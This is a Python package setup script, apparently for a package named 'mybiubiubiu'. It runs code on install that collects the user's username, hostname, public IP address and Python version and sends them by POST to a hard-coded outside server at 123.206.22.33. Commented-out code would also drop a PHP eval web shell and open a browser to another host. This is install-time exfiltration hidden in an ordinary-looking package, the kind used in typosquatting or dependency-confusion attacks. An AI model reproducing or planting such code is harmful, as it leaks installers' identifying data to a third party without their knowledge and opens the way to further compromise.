#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import sys
import time
import json
import getpass
import hashlib
import platform
import tempfile
import webbrowser
import setuptools
from setuptools.command.install import install


def request(url, method='GET', data=None, headers=None):
    headers = headers or {}
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def fun():
    username = getpass.getuser()
    hostname = platform.node()
    print username
    #print hostname
    ip = request("https://enabledns.com/ip",method='GET')
    timenow = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    # filename = os.path.join(
    #     tempfile.gettempdir(),
    #     hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()
    # )
    #print filename
    # if os.path.exists(filename):
    #     print “filename exists”
    #     return
    # try:
    #     f = open(filename, 'w')
    #     #evalstr = "sakura\n<?php @eval($_POST['c']);?>"
    #     evalstr = "hello world"
    #     f.write(evalstr)
    #     #print "ok"
    # except:
    #     #print "err"
    #     pass
    
    data = {
        "username": str(username),
        "hostname": str(hostname),
        "ip":str(ip),
        "package": "mybiubiubiu",
        "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
        "time":str(timenow),
        "submit":"Submit"
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        request(
            url="http://123.206.22.33:5000/p/",
            method='POST',
            data=json.dumps(data).encode("utf-8", errors='ignore'),
            headers=headers
        )
        print "hhh"
    except:
        print "failed"
        pass

    # try:
    #     webbrowser.open("http://snowty.cn:5000")
    # except:
    #     pass


fun()